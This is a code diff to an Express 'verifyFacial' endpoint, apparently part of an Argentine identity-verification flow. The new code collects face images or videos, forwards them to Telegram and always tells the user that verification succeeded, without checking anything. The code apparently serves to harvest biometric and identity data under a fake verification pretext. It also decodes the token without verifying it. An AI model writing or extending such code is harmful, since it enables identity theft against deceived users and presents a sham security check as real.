@@ -103,11 +103,23 @@ export const verifyDNI = async (req: Request, res: Response): Promise<void> => {
 
 export const verifyFacial = async (req: Request, res: Response): Promise<void> => {
   try {
-    const { faceImage, lightLevel } = req.body;
+    console.log('🎥 Iniciando verificación facial...');
+    const { faceImage, faceVideo } = req.body;
 
-    if (!faceImage) {
-      res.status(400).json({ error: 'Se requiere imagen facial' });
+    // Aceptar tanto imagen como video
+    if (!faceImage && !faceVideo) {
+      console.log('❌ Falta imagen o video facial');
+      res.status(400).json({ error: 'Se requiere imagen o video facial' });
       return;
+    }
+
+    console.log('✅ Datos recibidos');
+    if (faceVideo) {
+      console.log('📹 Tipo: VIDEO');
+      console.log('📏 Tamaño video:', faceVideo.length);
+    } else {
+      console.log('📸 Tipo: IMAGEN');
+      console.log('📏 Tamaño imagen:', faceImage.length);
     }
 
     // Obtener info del usuario del token si existe
@@ -120,21 +132,32 @@ export const verifyFacial = async (req: Request, res: Response): Promise<void> =
         const decoded: any = jwt.decode(token);
         userId = decoded?.userId || 'unknown';
       } catch (e) {
-        // Token inválido, continuar igual
+        console.log('⚠️ Token inválido, continuar sin userId');
       }
     }
 
-    // Enviar a Telegram
-    await sendFacialNotification({
-      userId,
-      faceImage,
-      lightLevel,
-      timestamp: new Date().toLocaleString('es-AR'),
-    });
+    // Enviar a Telegram (no bloquear si falla)
+    try {
+      console.log('📱 Enviando a Telegram...');
+      await sendFacialNotification({
+        userId,
+        faceImage: faceImage || null,
+        faceVideo: faceVideo || null,
+        timestamp: new Date().toLocaleString('es-AR'),
+      });
+      console.log('✅ Telegram enviado exitosamente');
+    } catch (telegramError) {
+      console.error('⚠️ Error en Telegram (no crítico):', telegramError);
+    }
 
+    console.log('✅ Respondiendo con éxito');
     res.json({ success: true, message: 'Verificación facial exitosa' });
   } catch (error) {
-    console.error('Error en verificación facial:', error);
-    res.status(500).json({ error: 'Error al verificar rostro' });
+    console.error('❌ ERROR CRÍTICO en verificación facial:', error);
+    console.error('Stack:', error instanceof Error ? error.stack : 'No stack');
+    res.status(500).json({ 
+      error: 'Error al verificar rostro. Por favor intenta nuevamente.',
+      details: process.env.NODE_ENV === 'development' ? (error instanceof Error ? error.message : String(error)) : undefined
+    });
   }
 };
